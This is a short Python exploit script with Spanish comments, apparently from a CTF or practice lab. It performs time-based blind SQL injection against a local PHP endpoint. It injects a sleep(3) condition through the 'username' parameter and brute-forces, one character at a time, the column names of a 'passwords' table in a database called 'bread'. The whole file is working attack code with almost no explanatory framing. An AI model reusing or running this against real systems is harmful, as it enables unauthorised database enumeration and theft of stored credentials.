#!/usr/bin/python3

import requests, time
from pwn import *

url = "http://localhost:1234/index.php"

p3 = log.progress("SQLi blind")
session = requests.Session()

dic_letters = "abcdefghijklmnopqrstuvwxyz0123456789.+!$#-~_<>}:\"\'{*][%,&/\)(=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
result = ""

# Por ejemplo para recorrer 5 columnas, una por una
for column_num in range(0, 5):
    p4 = log.progress("Column name")
    # Recorremos como si la palabra encontrada tuviera 15 caracteres
    for position in range(1, 16):
        # Probamos con cada letra de nuestro diccionario
        for letter in dic_letters:
            # Obtenemos el tiempo antes de la peticion
            time_now = time.time()

            # Nos posicionamos en la tabla "passwords" de la DB "bread" y validamos X letra en N posicion de cada columna
            payload = "?method=select&"
            payload += "username=administrator' and if(substr((SELECT column_name FROM information_schema.columns WHERE table_schema='bread' and table_name='passwords' LIMIT %d,1),%d,1)='%s',sleep(3),1) and '1'='1&" % (column_num, position, letter)
            payload += "table=passwords"

            p3.status(payload)
            r = session.get(url + payload)

            # Obtenemos el tiempo despues de la peticion
            time_after = time.time()

            # Si la diferencia de tiempos en mayor a 3, sabemos que la letra que probo esta en la base de datos, asi que la guardamos
            if time_after - time_now > 2:
                result += letter
                p4.status(result)
                break

    p4.success(result)
    result = ""

p3.success("Done")
